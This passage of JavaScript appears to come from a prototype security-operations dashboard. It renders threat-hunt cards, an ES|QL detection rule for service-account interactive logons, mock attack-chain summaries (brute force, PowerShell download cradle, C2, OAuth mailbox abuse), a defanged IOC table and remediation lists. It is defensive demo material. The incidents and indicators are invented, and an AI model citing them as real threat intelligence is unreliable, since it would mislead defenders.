    findWord:'Significant event', noFind:'No significant findings — logged, indicator stays tracked.',
    doneMain:'Hunt complete — no significant findings', doneSub:'logged · the indicator stays tracked',
    dismissMsg:'Hunt removed from the backlog. The indicator that generated it stays tracked.',
  };
}
function huntRunning(id){ return state.huntRun && state.huntRun[id]; }
function skiFlyHTML(){
  const S=huntSet();
  const techCard=t=>`<div class="ski-card"><span class="ski-ic">${ic(t.icon,15)}</span><div class="ski-b"><div class="ski-n">${t.name}</div><div class="ski-m">${t.meta}</div></div>${t.kev?`<span class="ski-kev">${ic('warn',11)} ${t.kev}</span>`:''}</div>`;
  return `<aside class="ski-fly" id="skiFly" role="dialog" aria-label="${S.knowLabel}">
    <div class="ski-fly-h">
      <span class="ski-fly-ic">${ic(S.knowIcon,16)}</span>
      <div class="ski-fly-tw"><div class="ski-fly-t">${S.knowLabel}</div><div class="ski-fly-s">What drives the hunt backlog</div></div>
      <span class="ski-fly-refresh">${ic('clock',12)} ${S.refreshed}</span>
      <button class="ski-fly-x" title="Close" onclick="App.closeSki()">${ic('x',16)}</button>
    </div>
    <div class="ski-fly-body">
      <div class="hunt-lead">${S.knowLead}</div>
      <div class="ski-sech"><h3>${S.techHead}</h3><span class="c">${S.techSub}</span></div>
      <div class="ski-grid">${S.tech.map(techCard).join('')}</div>
      <div class="ski-fly-note">${ic('sparkle',14)}<span>${S.knowNote}</span></div>
    </div>
  </aside>`;
}
function huntRowHTML(h){
  const S=huntSet();
  const running=huntRunning(h.id);
  const done=running==='done';
  const found = done && !!h.find;
  let foot;
  if(found){ foot=''; }
  else if(done){ foot=`<div class="hx-done">${ic('check',13)} ${S.doneMain}<span class="hx-done-sub">${S.doneSub}</span></div>`; }
  else if(running){ foot=`<div class="hx-runline"><span class="rad-spin"></span>Running across ${h.sources.length} sources — ${h.sources.join(', ')}…</div>`; }
  else foot=`<div class="hx-acts"><button class="hbk-ghost" onclick="App.toast('info','Dismissed','${S.dismissMsg}')">Dismiss</button><span class="rad-act-div"></span><button class="hbk-ghost hbk-chat" onclick="App.openThread('${S.thread}')">${ic('sparkle',12)} Refine in chat</button><button class="hbk-run" onclick="App.runHunt('${h.id}')">${ic('target',12)} Run hunt</button></div>`;
  const f=h.find;
  const sse = found ? `<div class="hbk-sse">
      <div class="sse-h"><span class="sse-tag">${f.tag}</span> ${f.head}</div>
      <div class="sse-body">${f.body}</div>
      <div class="sse-acts"><button class="hbk-run" onclick="App.promoteDetection()">${ic('bolt',13)} ${f.promote}</button><button class="hbk-ghost" onclick="App.toast('info','${f.esT}','${f.esB}')">${ic('arrow',12)} ${f.escalate}</button><button class="hbk-ghost" onclick="App.toast('info','Dismissed','${f.dismiss}')">Dismiss</button></div>
    </div>` : '';
  return `<div class="hx-row${found?' on-sse':''}" id="hunt-${h.id}" style="--sev:${h.sev}">
    <div class="hx-row-head"><span class="hbk-score">${h.score}</span><span class="hx-row-title">${h.title}</span><span class="hx-ttp">${h.tag||h.ttp}</span></div>
    <button class="hx-driver" title="${S.driverTitle}" onclick="App.openSki()">${ic('sparkle',12)} ${h.driver}</button>
    <div class="hx-hypo">${h.hypo}</div>
    <div class="hx-meta">${h.sources.map(s=>`<span class="hbk-chip">${ic('db',11)} ${s}</span>`).join('')}<span class="hbk-chip hbk-chip-goal">${ic('arrow',11)} ${h.outcome}</span></div>
    ${foot}${sse}</div>`;
}
function adhocHTML(){
  const a=state.adhocHunt; if(!a) return '';
  const night=(state.mode||'dayshift')==='nightshift';
  if(night){
    if(a.phase==='running') return `<div class="hx-adhoc"><div class="hx-adhoc-h"><span class="rad-spin"></span><b>Hunting</b><span class="hx-adhoc-q">${a.q}</span><span class="hx-adhoc-note">across latency, error-rate, and saturation metrics…</span></div></div>`;
    return `<div class="hx-adhoc">
      <div class="hx-adhoc-h">${ic('target',14)}<b>Hunt results</b><span class="hx-adhoc-q">${a.q}</span><span class="hx-adhoc-note">4 services · last 1h</span><button class="hx-adhoc-x" title="Dismiss results" onclick="App.adhocClear()">${ic('x',14)}</button></div>
      ${nightEventsTable()}
      <div class="hx-adhoc-f"><span class="hx-adhoc-fnote">${ic('warn',13)} 1 SLO breach — inspect before dismissing</span><button class="hbk-ghost" onclick="App.adhocSave()">${ic('clip',12)} Save as saved hunt</button><button class="hbk-ghost" onclick="App.adhocClear()">Dismiss</button></div>
    </div>`;
  }
  if(a.phase==='running') return `<div class="hx-adhoc"><div class="hx-adhoc-h"><span class="rad-spin"></span><b>Hunting</b><span class="hx-adhoc-q">${a.q}</span><span class="hx-adhoc-note">across endpoint, auth, and network telemetry…</span></div></div>`;
  return `<div class="hx-adhoc">
    <div class="hx-adhoc-h">${ic('target',14)}<b>Hunt results</b><span class="hx-adhoc-q">${a.q}</span><span class="hx-adhoc-note">3 sources · last 24h</span><button class="hx-adhoc-x" title="Dismiss results" onclick="App.adhocClear()">${ic('x',14)}</button></div>
    ${eventsTable()}
    <div class="hx-adhoc-f"><span class="hx-adhoc-fnote">${ic('warn',13)} 1 high-risk execution — inspect before dismissing</span><button class="hbk-ghost" onclick="App.adhocSave()">${ic('clip',12)} Save as saved hunt</button><button class="hbk-ghost" onclick="App.adhocClear()">Dismiss</button></div>
  </div>`;
}
function scrollToHunt(id){
  const c=document.getElementById('hunt-'+id); if(!c) return;
  let p=c.parentElement;
  while(p && p!==document.body && p.scrollHeight<=p.clientHeight+4) p=p.parentElement;
  if(p && p!==document.body){ const pr=p.getBoundingClientRect(), cr=c.getBoundingClientRect(); p.scrollTo({top:p.scrollTop+(cr.top-pr.top)-84,behavior:'smooth'}); }
  c.classList.remove('hit'); void c.offsetWidth; c.classList.add('hit');
}
/* ---- Scenario 6: hunt finding → detection rule review ---- */
const DETECTION_REVIEW={type:'detection',
  hypothesis:'A non-interactive service account performing an interactive (type 10) logon indicates credential theft or hands-on-keyboard activity. The existing "Unusual service account logon" rule watches workstation subnets only — the DB and server tiers are uncovered.',
  lang:'ES|QL',
  diff:[
    ['ctx','FROM logs-windows.security-*'],
    ['add','| WHERE event.code == "4624" AND winlog.logon.type == 10'],
    ['add','| WHERE user.name IN (svc_accounts) AND NOT host.name IN (jump_hosts)'],
    ['add','| STATS hits = COUNT(*) BY host.name, user.name, source.ip'],
    ['ctx','| WHERE hits >= 1'],
  ],
  matches:1, fpRate:'<0.1%', expectedVol:'<1/mo',
  blindspots:['Service accounts not following the svc-* convention (or missing the directory tag) are not covered.','A sanctioned break-glass interactive use by an admin service account would match and need an exception.'],
  coverage:'Closes the T1078.002 server-tier gap',
  backtestWindow:'90 days'};
const MONITOR_REVIEW={type:'detection',
  hypothesis:'search-api returns HTTP 200 with an empty body after an upstream timeout. These count as successful today, so they burn the error budget invisibly. A new SLI should treat empty-after-timeout as a failure.',
  lang:'PromQL / SLI',
  diff:[
    ['ctx','# good = 200 AND non-empty AND not upstream_timeout'],
    ['add','| sum(rate(http_requests_total{svc="search-api",code="200"}[5m]))'],
    ['add','|   - sum(rate(search_empty_after_timeout_total{svc="search-api"}[5m]))'],
    ['ctx','| / sum(rate(http_requests_total{svc="search-api"}[5m]))'],
    ['add','| # target 99.9% / 30d · burn-rate alert at 2× and 14×'],
  ],
  matches:3, fpRate:'<0.2%', expectedVol:'~1/wk',
  blindspots:['Legitimately empty results (a rare query with no matches) are excluded via the upstream_timeout tag — if that tag is missing they would count as failures.','Only covers search-api; the same pattern on other read paths needs its own SLI.'],
  coverage:'Closes the silent-success budget gap',
  backtestWindow:'30 days'};
function detectionModalHTML(){
  const night=(state.mode||'dayshift')==='nightshift';
  const rv=night?MONITOR_REVIEW:DETECTION_REVIEW;
  const t=night?'Promote to SLO monitor':'Promote to detection rule';
  const sub=night?'From hunt NB1 · Silent success on search-api':'From hunt HB1 · Service-account interactive logon';
  const go=night?'Create monitor':'Create rule';
  const perm=night?'Monitor creation permitted':'Rule creation permitted';
  const thread=night?'night-1':'day-1';
  return `<div class="det-mask" id="detMask" onclick="if(event.target===this)App.closeDetection()">
    <div class="det-card">
      <div class="det-head"><span class="dh-ic">${ic('bolt',16)}</span><div style="flex:1"><div class="dh-t">${t}</div><div class="dh-sub">${sub}</div></div><button class="det-x" onclick="App.closeDetection()">${ic('x',16)}</button></div>
      <div class="det-body">${proposalReview(rv)}</div>
      <div class="det-foot"><button class="btn go" onclick="App.confirmDetection()">${ic('check',14)} ${go}</button><button class="btn ghost" onclick="App.openThread('${thread}')">${ic('sparkle',13)} Edit logic in chat</button><span class="det-perm">${ic('shield',13)} ${perm}</span></div>
    </div>
  </div>`;
}
/* ============================================================ SCENARIO 3: ATTACK DISCOVERY EXTENSION */
const ATTACK_DISCOVERIES=[
  {id:'ad1',score:91,sev:'var(--red)',title:'Credential theft → lateral movement on the finance subnet',
    summary:'Elastic Security correlated 5 alerts across FIN-WS-04 and FIN-DC-01 into one attack chain: a brute-force burst, a successful interactive logon as a dormant service account, an encoded PowerShell download cradle, outbound C2, and an SMB pivot attempt.',
    ents:[['user','svc-backup'],['host','FIN-WS-04'],['host','FIN-DC-01'],['network','45.137.x.x']],
    mitre:['T1110.001','T1078.002','T1059.001','T1071.001','T1021.002'],
    gap:'interactive (type 10) logons by dormant service accounts are not covered on the server tier',
    chain:[['02:18','247 failed logons against FIN-WS-04 (brute force)'],['02:41','Successful interactive (type 10) logon as svc-backup'],['02:41','Encoded PowerShell download cradle spawned'],['02:42','Outbound C2 to 45.137.x.x:443 established'],['02:44','SMB lateral-movement attempt to FIN-DC-01 (failed)']],
    resp:[['Disable <code>svc-backup</code> across the directory','gated','disable'],['Isolate FIN-WS-04 from the network','gated','isolate'],['Block egress to 45.137.x.x fleet-wide','gated'],['Hunt this TTP on peer hosts','auto']],
    miss:[['a','Have','sign-in logs, process lineage, and network flows for FIN-WS-04'],['q','Missing','memory capture on FIN-WS-04 — the C2 payload was never retrieved'],['q','Open question','did svc-backup authenticate anywhere else inside the burst window?'],['a','Assumption','the SMB attempt failed; no successful pivot to FIN-DC-01 yet']]},
  {id:'ad2',score:68,sev:'var(--amber)',title:'OAuth consent abuse on jdoe@corp mailbox',
    summary:'Three alerts linked into one chain: a new third-party OAuth app granted mailbox.read, an unusual full mailbox sync, and an inbox forwarding rule created minutes later. Continues CASE-2039 — consent was revoked yesterday; the access review is still open.',
    ents:[['user','jdoe@corp'],['doc','OAuth app'],['at','mailbox.read']],
    mitre:['T1098.002','T1114.002'],
    gap:'no rule pairs a new OAuth consent with an immediate full-mailbox sync',
    chain:[['Tue 14:02','New OAuth app granted mailbox.read consent'],['Tue 14:09','Full mailbox sync performed by the app'],['Tue 14:15','Inbox forwarding rule created']],
    resp:[['Verify the consent stays revoked','auto'],['Remove the forwarding rule','gated'],['Force re-auth for jdoe@corp','gated']],
    miss:[['a','Have','consent grant record, mailbox audit log, forwarding-rule change'],['q','Missing','confirmation of what the app actually read in the sync'],['q','Open question','were other identities granted to the same app?']]},
];
const AD_CONT=[
  {key:'investigate',icon:'investigation',label:'Start investigation'},
  {key:'timeline',icon:'list',label:'Generate case timeline'},
  {key:'response',icon:'bolt',label:'Propose response actions'},
  {key:'evidence',icon:'search',label:'Identify missing evidence'},
  {key:'contain',icon:'lock',label:'Draft containment plan'},
  {key:'hunt',icon:'target',label:'Propose follow-up hunt'},
  {key:'detection',icon:'bolt',label:'Draft detection improvement'},
];
function adArtifact(d,key){
  if(key==='investigate') return {h:'Investigation proposal',tag:'proposal',
    body:`<div class="ad-art-body">Open an investigation on this chain, owned by you, with the ${d.chain.length} correlated events, ${d.ents.length} entities, and the original Attack Discovery linked as the source.</div>
      <ul class="ad-list2"><li>Scope: ${d.ents.map(e=>e[1]).join(', ')}</li><li>Pulls full session + process lineage for the affected hosts</li><li>Forms the first hypothesis automatically, then gathers evidence for and against</li></ul>`,
    go:'Start investigation'};
  if(key==='timeline') return {h:'Case timeline',tag:'generated',
    body:`<div class="ad-art-body">A merged timeline from the correlated alerts, endpoint events, and prior analyst actions:</div>
      <div class="ad-chain" style="margin-top:10px">${d.chain.map(c=>`<div class="ad-step"><div class="as-t">${c[0]}</div><div class="as-x">${c[1]}</div></div>`).join('')}</div>`,
    go:'Save to case'};
  if(key==='response'){ const t0=state.threads['day-1']||{}; const taken=new Set((t0.actions||[]).filter(a=>a.status!=='proposed').map(a=>a.kind)); return {h:'Response plan draft',tag:'draft',
    body:`<ul class="ad-list2">${d.resp.map(r=>`<li>${r[0]} — <b>${(r[2]&&taken.has(r[2]))?'done':(r[1]==='gated'?'gated':'auto')}</b></li>`).join('')}</ul>
      <div class="ad-art-body" style="margin-top:8px;color:var(--ink-3)">Each gated step carries its blast radius and asks before it runs. Steps already taken in the linked record show as done.</div>`,
    go:'Open response plan'}; }
  if(key==='evidence') return {h:'Evidence & assumptions',tag:'analysis',
    body:`<div class="ad-assume">${d.miss.map(m=>`<div class="ad-assume-row ${m[0]}"><span class="aa-ic">${ic(m[0]==='q'?'warn':'check',13)}</span><span><b>${m[1]}</b> — ${m[2]}</span></div>`).join('')}</div>`,
    go:'Request the missing evidence'};
  if(key==='contain') return {h:'Containment plan draft',tag:'draft',
    body:`<ul class="ad-list2">${d.resp.filter(r=>r[1]==='gated').map(r=>`<li>${r[0]}</li>`).join('')}<li>Each action is reversible and logged to the case audit trail</li></ul>`,
    go:'Open containment plan'};
  if(key==='hunt') return {h:'Follow-up hunt proposal',tag:'proposal',
    body:`<div class="ad-art-body">Hunt the same tradecraft beyond this chain — scoped from the discovery, filed to the hunt backlog with this discovery as its driver.</div>
      <ul class="ad-list2"><li>Hypothesis: the TTPs seen here (${d.mitre.slice(0,3).join(', ')}) recur on peer hosts outside the alerted window</li><li>Scope: ${d.ents.map(e=>e[1]).join(', ')} → widened to their peer group</li><li>Runs within approved autonomy — findings come back as reviewable significant events</li></ul>`,
    go:'Add to hunt backlog'};
  if(key==='detection') return {h:'Detection improvement draft',tag:'draft',
    body:`<div class="ad-art-body">This chain exposed a coverage gap — <b>${d.gap||'part of the chain fired no rule'}</b>. NotDaybreak drafts the rule improvement from the observed behavior, with sample matching events from this discovery attached.</div>
      <ul class="ad-list2"><li>Backtest and estimated false-positive rate run before anything ships</li><li>Known blind spots are called out for the detection engineer</li><li>The rule is versioned — disable or revert anytime</li></ul>`,
    go:'Open rule review'};
  return {h:key,tag:'',body:'',go:'Continue'};
}
function renderDiscoveriesPage(b){
  const sel=state.adSel?ATTACK_DISCOVERIES.find(d=>d.id===state.adSel):null;
  if(!sel){
    const row=d=>`<div class="hx-row" style="--sev:${d.sev};cursor:pointer" onclick="App.adOpen('${d.id}')">
      <div class="hx-row-head"><span class="hbk-score">${d.score}</span><span class="hx-row-title">${d.title}</span><span class="hx-ttp">${d.mitre.length} techniques</span></div>
      <div class="hx-hypo">${d.summary}</div>
      <div class="hx-meta">${d.ents.map(e=>`<span class="hbk-chip">${ic(e[0],11)} ${e[1]}</span>`).join('')}</div>
      <div class="hx-acts"><button class="hbk-ghost hbk-chat" onclick="event.stopPropagation();App.openThread('day-1')">${ic('sparkle',12)} Refine in chat</button><button class="hbk-run" onclick="event.stopPropagation();App.adOpen('${d.id}')">${ic('siren',12)} Open the chain</button></div>
    </div>`;
    b.innerHTML=`<div class="page-pad huntx">
      <div class="hunt-lead">These are <b>Elastic Security Attack Discoveries</b> — alerts already correlated into attack chains. NotDaybreak doesn’t replace them; it <b>continues from them</b>: turn a discovery into an investigation, a case timeline, a response plan, a follow-up hunt, or a detection improvement — with the original discovery preserved as the source.</div>
      <section class="hxsec" style="--grp:var(--red)">
        <div class="hxsec-h"><span class="hxsec-dot"></span><span class="hxsec-l">Correlated attack chains</span><span class="hxsec-n">${ATTACK_DISCOVERIES.length}</span><span class="hxsec-note">from Elastic Security · Attack Discovery</span></div>
        ${ATTACK_DISCOVERIES.map(row).join('')}
      </section>
    </div>`;
    return;
  }
  const contKey=state.adContKey;
  const contBtns=AD_CONT.map(c=>`<button class="ad-cont-btn ${contKey===c.key?'on':''}" onclick="App.adCont('${c.key}')">${ic(c.icon,14)} ${c.label}</button>`).join('');
  let artifact='';
  if(contKey){ const a=adArtifact(sel,contKey);
    artifact=`<div class="ad-artifact">
      <div class="ad-art-h">${ic('sparkle',15)} ${a.h}<span class="tag">${a.tag}</span></div>
      ${a.body}
      <div class="ad-art-acts"><button class="ad-go" onclick="App.adCreate('${contKey}','${sel.id}')">${ic('check',13)} ${a.go}</button><button class="ad-ghost" onclick="App.openThread('day-1')">${ic('sparkle',12)} Refine in chat</button><button class="ad-ghost" onclick="App.toast('info','Sent for review','Routed for review with the Attack Discovery and the draft attached.')">Send for review</button></div>
    </div>`;
  }
  b.innerHTML=`<div class="page-pad">
    <button class="ad-back" onclick="App.adBack()">${ic('arrow',13)} All discoveries</button>
    <div class="ad-detail-h"><div class="adh-b">
      <div class="ad-src-tag">${ic('siren',12)} Elastic Security · Attack Discovery</div>
      <div class="ad-title" style="font-size:16px">${sel.title}</div>
      <div class="ad-narr">${sel.summary}</div>
    </div></div>
    <div class="ad-sec"><h4>${ic('list',13)} Correlated chain</h4>
      <div class="ad-chain">${sel.chain.map(c=>`<div class="ad-step"><div class="as-t">${c[0]}</div><div class="as-x">${c[1]}</div></div>`).join('')}</div></div>
    <div class="ad-sec"><h4>${ic('target',13)} MITRE ATT&CK</h4><div class="minitags">${sel.mitre.map(x=>`<span class="mtag">${x}</span>`).join('')}</div></div>
    <div class="ad-cont">
      <div class="ad-cont-h">${ic('sparkle',15)} Continue with NotDaybreak</div>
      <div class="ad-cont-sub">Pick a next step. The original Attack Discovery stays the source of truth — these add to it, they don’t replace it.</div>
      <div class="ad-cont-btns">${contBtns}</div>
      ${artifact}
    </div>
  </div>`;
}
/* ============================================================ SCENARIO 7: DEEP WATCH SPECIALIST WORKBENCH */
function DW_BUNDLE_ROWS(){ const t=state.threads['day-1']||{}; const isRec=t.type&&t.type!=='chat'&&t.recordId; const caseLbl=isRec?(t.recordId+' · '+((TYPE_META[t.type]||{}).label||'Record')):'Pending — promote the FIN-WS-04 thread'; const done=(t.actions||[]).filter(a=>a.status!=='proposed').map(a=>a.title); const prior=done.length?done.join(' · '):'None yet'; return [['Case',caseLbl],['Entities','svc-backup · FIN-WS-04 · FIN-DC-01'],['Alerts','5 correlated'],['Window','02:18–02:46 UTC'],['Prior actions',prior],['Requested by','Watch Officer (approved by Maya Chen)']]; }
const DW_REQ=[
  {key:'malware',icon:'terminal',label:'Malware behavior summary'},
  {key:'forensic',icon:'list',label:'Forensic timeline reconstruction'},
  {key:'infra',icon:'network',label:'Related infrastructure mapping'},
  {key:'remediation',icon:'shield',label:'Remediation recommendations'},
];
const DW_IOC=[
  ['SHA-256','a1f3c9…2b7e','download-cradle script (a.ps1)'],
  ['IPv4','45.137.x.x','C2 endpoint'],
  ['Domain','update-sync[.]net','C2 resolver'],
  ['Account','svc-backup','compromised service account'],
];
const DW_REM=[
  {t:'Rotate svc-backup credentials and remove interactive-logon rights',owner:'IAM'},
  {t:'Rebuild FIN-WS-04 from a known-good image',owner:'Endpoint'},
  {t:'Block 45.137.x.x and update-sync[.]net at the perimeter',owner:'NetSec'},
  {t:'Add a detection for interactive service-account logons',owner:'Detection'},
];
function renderDeepWatchPage(b){
  const done=state.dwDone||{};
  const rem=state.dwRem||{};
  const reqBtn=r=>`<button class="dw-req ${done[r.key]?'done':''}" onclick="App.dwReq('${r.key}')">${ic(done[r.key]?'check':r.icon,14)} ${r.label}<span class="chev">${done[r.key]?'requested':ic('arrow',12)}</span></button>`;
  const iocRow=i=>`<tr><td><span class="ioc-type">${i[0]}</span></td><td>${i[1]}</td><td style="font-family:inherit;color:var(--ink-3)">${i[2]}</td></tr>`;
  const remRow=(r,idx)=>`<div class="rem-item ${rem[idx]?'on':''}"><span class="rem-cb ${rem[idx]?'on':''}" onclick="App.dwRem(${idx})">${ic('check',11)}</span><span class="rem-t">${r.t}</span><span class="rem-owner">${r.owner}</span></div>`;
  const anyReq=Object.keys(done).length>0;
  b.innerHTML=`<div class="page-pad">
    <div class="dw-lead">Specialists open here with the case <b>already packaged</b> — evidence, entities, prior decisions, and open questions — so the work starts from context, not a blank page. Request deeper analysis, then shape the report, IOCs, and remediation others will act on.</div>
    <div class="dw-grid">
      <div class="dw-panel"><div class="dw-ph">${ic('clip',15)} Evidence bundle<span class="dw-tag">from Watch Officer</span></div>
        <div class="dw-bundle">${DW_BUNDLE_ROWS().map(r=>`<div class="dw-brow"><span class="bk">${r[0]}</span><span class="bv">${r[1]}</span></div>`).join('')}</div></div>
      <div class="dw-panel"><div class="dw-ph">${ic('sparkle',15)} Request analysis</div>
        <div class="dw-req-btns">${DW_REQ.map(reqBtn).join('')}</div></div>
      <div class="dw-panel full"><div class="dw-ph">${ic('doc',15)} Draft report<span class="dw-tag">${anyReq?'updating':'awaiting analysis'}</span></div>
        ${anyReq?`<div class="dw-report">
          <h5>Summary <span class="dw-conf high">high confidence</span></h5>
          <p>A hands-on-keyboard operator used stolen <code>svc-backup</code> credentials to gain an interactive foothold on FIN-WS-04, ran an encoded PowerShell download cradle, and established C2 before attempting an SMB pivot to FIN-DC-01. The pivot failed; containment caught the host before data movement.</p>
          <h5>Malware behavior <span class="dw-conf med">medium confidence</span></h5>
          <p>The cradle fetched a second-stage from 45.137.x.x. The payload was not recovered (no memory capture), so second-stage capability is inferred from network behavior rather than analyzed directly.</p>
          <h5>Unresolved questions</h5>
          <p>Did the operator reuse svc-backup elsewhere during the burst window? Was anything staged for exfiltration before isolation?</p>
        </div>`:`<div class="ad-art-body" style="color:var(--ink-3)">Request an analysis above and NotDaybreak drafts the report here — editable, with confidence levels and unresolved questions called out.</div>`}
      </div>
      <div class="dw-panel"><div class="dw-ph">${ic('target',15)} Indicators of compromise<span class="dw-tag">${DW_IOC.length}</span></div>
        <table class="ioc-tbl"><thead><tr><th>Type</th><th>Indicator</th><th>Context</th></tr></thead><tbody>${DW_IOC.map(iocRow).join('')}</tbody></table></div>
      <div class="dw-panel"><div class="dw-ph">${ic('check',15)} Remediation checklist<span class="dw-tag">${Object.values(rem).filter(Boolean).length}/${DW_REM.length}</span></div>
        <div class="rem-list">${DW_REM.map(remRow).join('')}</div></div>
    </div>
    <div class="dw-foot"><button class="ad-go" onclick="App.toast('ok','Report shared','Final report, IOCs, and remediation checklist attached to the case record and shared with the response team.')">${ic('check',13)} Approve & share report</button><button class="ad-ghost" onclick="App.toast('info','Exported','IOC table exported as a STIX bundle.')">${ic('arrow',12)} Export IOCs</button></div>
  </div>`;
}
function renderStreamsPage(b){
  b.innerHTML=`<div class="page-pad"><div class="stub-card"><span class="stub-ic">${ic('streams',32)}</span>
    <h3>Streams</h3>
    <p>Define and reshape ingest pipelines — route, enrich, and reshape data as it lands, before it’s indexed. This surface is a preview in this prototype.</p>
    <div class="stub-flow"><span class="sf-node">Source</span>${ic('arrow',14)}<span class="sf-node">Route</span>${ic('arrow',14)}<span class="sf-node">Enrich</span>${ic('arrow',14)}<span class="sf-node">Index</span></div>
  </div></div>`;
}

/* ============================================================ AGENT CONTROL PLANE (cross-domain) */
function autMeter(level){ let s='<span class="aut" role="img" aria-label="Autonomy level '+level+' of '+AUT_N+' — '+(AUT_LABELS[level-1]||'')+'">'; for(let i=1;i<=AUT_N;i++) s+=`<i class="${level>=i?'on':''}"></i>`; return s+'</span>'; }
function renderAgentsHubPage(c){
  const views=[
    {key:'agents',name:'Watches',sub:'Coverage, autonomy & schedule',icon:'eye'},
    {key:'workflows',name:'Workflows',sub:'Triggered runs across watches',icon:'workflow'},
    {key:'skills',name:'Skills',sub:'Capabilities & connectors',icon:'layers'},
    {key:'activity',name:'Activity',sub:'Run & trust ledger',icon:'sx-activity'},
    {key:'performance',name:'Performance',sub:'Value, quality & cost',icon:'pulse'},
    {key:'guardrails',name:'Guardrails',sub:'Autonomy & approvals',icon:'shield'},
  ];
  const cur=views.find(v=>v.key===(state.agentsView||'agents'))||views[0];
  state.agentsView=cur.key;
  const items=views.map(v=>`<div class="nav-menu-item ${v.key===cur.key?'on':''}" onclick="App.openAgentView('${v.key}')"><span class="nmi-ic">${ic(v.icon,16)}</span> ${v.name}</div>`).join('');
  const panelSh='var(--panel-shadow, 0 1px 3px rgba(20,23,28,.05),0 10px 30px rgba(20,23,28,.06))';
  const agentMode=!!(state.nav&&state.nav.agentMode);
  const collapsed = agentMode ? true : !!state.agentsNavCollapsed;
  const aside=collapsed?'':`<aside style="width:272px;flex:0 0 auto;display:flex;flex-direction:column;min-height:0;overflow:hidden;background:var(--panel);border:1px solid var(--shell-line);border-radius:var(--r-lg);box-shadow:${panelSh}">
      ${leftPanelHeader({title:'Watches', collapse:true, onCollapse:"App.toggleAgentsNav()"})}
      <div class="nav-scroll">
        <div class="nav-menu">${items}</div>
      </div>
    </aside>`;
  const reopen=(collapsed && !agentMode)?`<button class="sidebar-toggle" title="Show watches menu" onclick="App.toggleAgentsNav()">${ic('sidebar',16)}</button>`:'';
  const selW=(cur.key==='agents' && state.watchSel) ? WATCHES.find(x=>x.id===state.watchSel) : null;
  let headHtml;
  if(selW){
    const w=selW;
    const SURF={dayshift:{n:'NotDaybreak',i:'sun'},nightshift:{n:'NightShift',i:'moon'}};
    const tab=s=>{ const m=SURF[s], on=(w.surfaces||[]).includes(s);
      return `<button class="wt-htab ${s} ${on?'on':''}" role="switch" aria-checked="${on}" title="${on?'Reports to '+m.n+' — click to stop':'Not reporting to '+m.n+' — click to add'}" onclick="App.toggleWatchSurface('${w.id}','${s}')">${ic(m.i,11)}<span>${m.n}</span></button>`; };
    headHtml=`<div class="page-title wt-ptitle">
        <button class="wt-hback" title="All watches" onclick="App.watchBack()">${ic('arrowl',15)}</button>
        <span class="ag-ic wt sm" style="color:${w.color};background:color-mix(in srgb,${w.color} 12%,transparent);--wt:${w.color}" role="button" tabindex="0" title="Change icon & color" onclick="App.watchIdPop(event,'${w.id}')">${ic(w.icon,16)}</span>
        <span class="wt-ptitle-n">${w.name}</span>
        <span class="wt-htabs">${tab('dayshift')}${tab('nightshift')}</span>
      </div>
      <div class="page-actions wt-hactions"><span class="ag-live ${w.on?'on':'draft'}" title="${watchStatus(w)}"><i></i></span><span class="sw ${w.on?'on':''}" title="${w.on?'Pause watch':'Resume watch'}" onclick="App.toggleWatch('${w.id}')"></span></div>`;
  } else {
    headHtml=`${reopen}<div class="page-title">${ic(cur.icon,18)} ${cur.name}<span class="page-sub">${cur.sub}</span></div><div class="page-actions">${pageActions(cur.key)}</div>`;
  }
  c.innerHTML=`<div style="display:flex;flex:1;min-height:0;gap:8px">
    ${aside}
    <div style="flex:1;min-width:0;display:flex;flex-direction:column;min-height:0;overflow:hidden;background:var(--panel);border:1px solid var(--shell-line);border-radius:var(--r-lg);box-shadow:${panelSh}">
      <div class="page-head">${headHtml}</div>
      <div class="page-body" id="agentsBody"></div>
    </div>
  </div>`;
  const b=document.getElementById('agentsBody'); if(!b) return;
  if(cur.key==='agents') renderWatchesPage(b);
  else if(cur.key==='workflows') renderWorkflowsPage(b);
  else if(cur.key==='skills') renderSkillsPage(b);
  else if(cur.key==='activity') renderActivityPage(b);
  else if(cur.key==='performance') renderPerformancePage(b);
  else if(cur.key==='guardrails') renderGuardrailsPage(b);
}
function agSpark(seed,n,W,H){
  n=n||18; W=W||56; H=H||18;
  let s=0; const str=String(seed); for(let i=0;i<str.length;i++) s=(s*31+str.charCodeAt(i))>>>0;
  const rnd=()=>{ s=(s*1664525+1013904223)>>>0; return s/4294967296; };
  const bw=W/n; let bars='';
  for(let i=0;i<n;i++){
    const t=n>1?i/(n-1):1;
    const v=0.22+0.58*rnd()+0.2*t;
    const h=Math.max(2, v*H);
    bars+=`<rect x="${(i*bw).toFixed(1)}" y="${(H-h).toFixed(1)}" width="${Math.max(1,bw-1.6).toFixed(1)}" height="${h.toFixed(1)}" rx="1"></rect>`;
  }
  return `<svg class="ag-spark" width="${W}" height="${H}" viewBox="0 0 ${W} ${H}" aria-hidden="true">${bars}</svg>`;
}
function watchSurfChips(w){
  const s=x=>`<span class="wt-surf ${x}">${ic(x==='dayshift'?'sun':'moon',10)} ${x==='dayshift'?'NotDaybreak':'NightShift'}</span>`;
  return `<span class="wt-surfs">${(w.surfaces||[]).map(s).join('')}</span>`;
}
function watchStatus(w){ return w.draft?'Draft':(w.on?'Active':'Paused'); }
function watchCardHTML(w){
  const lvl=autonomyOf(w.id);
  const stat=(v,k,extra)=>`<div class="ag-stat"><div class="ag-stat-v">${v==null?'—':v}${extra||''}</div><span class="ag-stat-k">${k}</span></div>`;
  return `<div class="agcard wt ${w.on?'':'paused'}" style="--wt:${w.color}" role="button" tabindex="0" onclick="App.openWatch('${w.id}')">
    <div class="ag-h"><span class="ag-ic wt" style="color:${w.color};background:color-mix(in srgb,${w.color} 12%,transparent)">${ic(w.icon,18)}</span><div class="ag-id"><div class="ag-name">${w.name}</div><div class="ag-dom">${w.mandate}</div></div>${w.on&&!w.draft?`<span class="ag-last">${w.last?('Last run '+w.last):'Never run'}</span>`:`<span class="ag-live draft"><i></i>${watchStatus(w)}</span>`}</div>
    <div class="ag-stats two${w.runs==null?' off':''}">
      ${stat(w.runs,'Runs · 7d', w.runs==null?'':agSpark(w.id))}
      ${stat(w.acc,'Accepted')}
    </div>
    <div class="ag-rows">
      <div class="ag-row"><span>Autonomy</span><b style="display:inline-flex;align-items:center;gap:7px">${autMeter(lvl)}${AUT_LABELS[lvl-1]}</b></div>
      <div class="ag-row"><span>Data scope</span><b>${w.scope}</b></div>
    </div>
  </div>`;
}
function coverageStrip(){
  const pct=n=>(n/24*100).toFixed(2);
  const seg=w=>(w.coverage||[]).map(([a,b])=>`<i style="left:${pct(a)}%;width:${pct(b-a)}%;background:color-mix(in srgb,${w.color} 70%,var(--panel))"></i>`).join('');
  const winLabel=w=>{
